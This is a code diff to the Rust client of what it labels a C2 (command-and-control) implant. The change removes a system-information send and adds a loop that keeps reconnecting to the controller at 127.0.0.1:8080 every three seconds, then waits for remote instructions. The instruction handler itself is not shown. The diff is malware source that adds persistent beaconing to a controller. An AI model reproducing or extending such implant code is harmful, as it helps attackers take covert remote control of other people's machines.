@@ -4,8 +4,9 @@ mod config;
 
 use std::io::{self};
 use std::net::TcpStream;
+use std::{thread, time};
 
-use handler::{send_sys_info, listening_for_instructions};
+use handler::{listening_for_instructions};
 
 /// The main entry point of the client application.
 ///
@@ -16,16 +17,26 @@ fn main() -> io::Result<()> {
     // C2 address port
     let ip = "127.0.0.1".to_string();
     let port = "8080".to_string();
-    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
-
-    println!("[I] Connected to server {}:{}.", ip, port);
-
-    // Send basic sysinfo for the C2 server
-    send_sys_info(&mut stream);
 
 
-    // Infinite loop
-    listening_for_instructions(&mut stream).unwrap();
+    loop {
+
+        println!("Connecting to server {}:{}.", ip, port);
+
+        match TcpStream::connect(format!("{}:{}", ip, port)) {
+            Ok(mut stream) => {
+                println!("Connected to {}:{}!", ip, port);
+                // Infinite loop
+                listening_for_instructions(&mut stream).unwrap();
+
+            }
+            Err(_) => {
+                println!("Error connecting. Trying again...");
+                thread::sleep(time::Duration::from_secs(3));
+            }
+        };
+
+    }
 
     Ok(())
 }
